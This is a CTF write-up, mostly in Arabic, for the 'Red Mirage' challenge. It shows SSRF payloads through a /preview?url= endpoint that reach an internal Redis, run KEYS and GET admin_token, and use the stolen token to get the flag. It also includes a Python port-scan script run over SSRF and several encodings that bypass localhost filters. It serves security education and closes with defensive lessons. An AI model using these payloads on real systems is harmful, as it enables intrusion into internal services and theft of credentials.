# redMirage

### [writeup](https://medium.com/@aliyasser0115139/red-mirage-challenge-writeup-the-mirage-that-shattered-6ca0de7d9fe8)

---

# Red Mirage CTF Writeup: SSRF & Redis Exploitation

## مقدمة
تحدي Red Mirage بيقع ضمن فئة **Web Exploitation / SSRF**.  
الموقع بيوفر خاصية لمعاينة روابط عن طريق endpoint `/preview?url=`.  
الثغرة كانت إننا نقدر نستغل الميزة دي للوصول لخدمات داخلية غير مخصصة للمستخدمين.

---

## ما هو SSRF؟
**SSRF (Server-Side Request Forgery)** هي ثغرة بتسمح للمهاجم بخداع السيرفر عشان يزور URLs هو نفسه مش المفروض يزورها.  
ده ممكن يستخدم للوصول لخدمات داخلية زي قواعد بيانات، Redis، أو حتى الـ cloud metadata.

---

## Redis: نظرة سريعة
- **Redis** قاعدة بيانات in-memory سريعة جدًا بتخزن بيانات على شكل key-value.  
- بتُستخدم غالبًا في:
  - تخزين الـ sessions
  - caching
  - queues
- البروتوكول بتاعها مش HTTP، لكنه بسيط وبيشتغل على TCP افتراضيًا على المنفذ **6379**.

---

## اكتشاف Redis داخليًا
### 1. جرب الوصول إلى localhost
```
/preview?url=http://127.0.0.1
```
لو السيرفر بيرد، ده معناه إنه بيقدر يوصل للخدمات الداخلية.

### 2. جرب بروتوكولات مختلفة
```
/preview?url=redis://127.0.0.1:6379/
```
لو البروتوكول `redis://` مقبول، غالبًا Redis شغالة.

### 3. فحص المنافذ (Port Scan)
- جرب منافذ شائعة: 80, 443, 6379, 3306, 27017 … إلخ
- باستخدام SSRF:
```
/preview?url=http://127.0.0.1:6379
```
- لو رجع خطأ مختلف عن "Connection refused"، يبقى المنفذ مفتوح.

### 4. ملاحظة مهمة
استخدام `http://` هنا بس عشان نعمل اختبار مبدئي للمنفذ، مش علشان Redis بتتكلم HTTP.

---

##  استخدام أوامر Redis لكشف كل الـ keys

لو الـ SSRF يسمح بتنفيذ أوامر Redis متعددة، ممكن تستخدم: 

```perl
/preview?url=redis://127.0.0.1:6379/KEYS%20*
```

---

## استغلال Redis
بمجرد اكتشاف Redis مفتوح على 6379، نستخدم بروتوكول `redis://`:
```
/preview?url=redis://127.0.0.1:6379/GET%20admin_token
```
ده بيرجع قيمة `admin_token`.

---

## استخدام التوكن
بعد ما نجيب التوكن:
```
Jj7YWT7wYyUSsDre8EfbKu05t3lQdeV3PyVJ
```
بنستخدمه للوصول لـ endpoint محمي:
```
/admin/flag?token=Jj7YWT7wYyUSsDre8EfbKu05t3lQdeV3PyVJ
```
بيرجع JSON فيه الفلاج:
```
{
  "flag": "nileN1nja{...}",
  "message": "Congratulations! You've successfully exploited the SSRF vulnerability.",
  "success": true
}
```

---

## الدروس المستفادة
- لازم تمنع **بروتوكولات غير HTTP/HTTPS**.
- ممنوع الوصول لعناوين داخلية زي `127.0.0.1`, `169.254.x.x`, `::1`.
- حماية الخدمات الداخلية زي Redis بكلمة مرور أو فايروال.
- الاعتماد على توكن واحد في المصادقة ضعيف جدًا.

---

## خطوات الهجوم بشكل مختصر
1. اكتشاف endpoint فيه SSRF (`/preview?url=`).
2. تجربة الوصول لـ 127.0.0.1 ومنافذ شائعة.
3. تأكيد وجود Redis على المنفذ 6379.
4. استخدام بروتوكول redis:// لتنفيذ أوامر GET.
5. استخراج `admin_token`.
6. استخدام التوكن للوصول لـ `/admin/flag` والحصول على الفلاج.

----
---
---

<details>
  <summary>know ports open on ssrf</summary>

# اكتشاف المنافذ المفتوحة عبر SSRF: شرح عملي

## مقدمة
في اختبارات الاختراق وCTFs، SSRF أحيانًا بيكون مدخلك لفحص الشبكة الداخلية للسيرفر.  
ممكن نستغل الـ SSRF لنعرف أي المنافذ (Ports) مفتوحة على localhost أو شبكات داخلية.

---

## ليه بنعمل Port Scanning عبر SSRF؟
- نعرف الخدمات الداخلية اللي مش مكشوفة للعالم الخارجي.
- نحدد هل في Redis, MySQL, MongoDB، إلخ.
- نجهز نفسنا للاستغلال بعد ما نعرف الخدمة المفتوحة.

---

## الطرق المستخدمة

### 1. تجربة بروتوكولات مختلفة
SSRF أحيانًا بيسمحلك تستخدم بروتوكولات متعددة زي:
- `http://`
- `file://`
- `gopher://`
- `redis://`

لو `redis://` شغال وبيستجيب → في خدمة Redis على السيرفر.

---

### 2. تجربة منافذ معروفة
نبدأ بالمنافذ الشائعة للخدمات:

- **3306** → MySQL
- **5432** → PostgreSQL
- **6379** → Redis
- **27017** → MongoDB
- **80/443** → HTTP/HTTPS
- **8080, 5000** → Web apps dev/test

نغير `url=` زي كده:
```
/preview?url=http://127.0.0.1:6379
```
- لو رجع خطأ مختلف عن "Connection refused"، يبقى المنفذ مفتوح.

---

### 3. Port Scanning كامل خطوة بخطوة

#### **خطوة 1:** تأكد إن SSRF بيقدر يوصل localhost
```
/preview?url=http://127.0.0.1
```
لو في استجابة، يبقى نقدر نكمل.

#### **خطوة 2:** جرّب كل منفذ محتمل
نعمل script صغير (مثال Python) يجرب منافذ محددة:

```python
import requests

target = "http://vulnerable.site/preview?url=http://127.0.0.1:"
ports = [80, 443, 6379, 27017, 3306, 8080, 5000]

for port in ports:
    url = target + str(port)
    r = requests.get(url)
    if "Connection refused" not in r.text:
        print(f"[+] Port {port} might be open!")
```

#### **خطوة 3:** لو منفذ مفتوح
- نحدد نوع الخدمة (Redis, MySQL, إلخ).
- نستخدم البروتوكول المناسب:  
  - `redis://` لـ Redis  
  - `mysql://` لـ MySQL (نادراً)  
  - أو نكلم الخدمة مباشرة بأوامرها.

---

## ملاحظات مهمة
- بعض الفلاتر تمنع `127.0.0.1` أو `localhost` → نستخدم bypass مثل:
  - `http://2130706433`
  - `http://0x7f000001`
  - `http://127.1`
  - `http://[::1]`

- بنبدأ بالمنافذ المشهورة وبعدها لو محتاجين نعمل brute-force أوسع.

---

## الخلاصة
1. تأكد إن SSRF يقدر يوصل عناوين داخلية.  
2. اعمل Port Scan على المنافذ الشائعة.  
3. لو لقيت منفذ مفتوح → حدد الخدمة واستغلها ببروتوكولها المناسب.

  
</details>

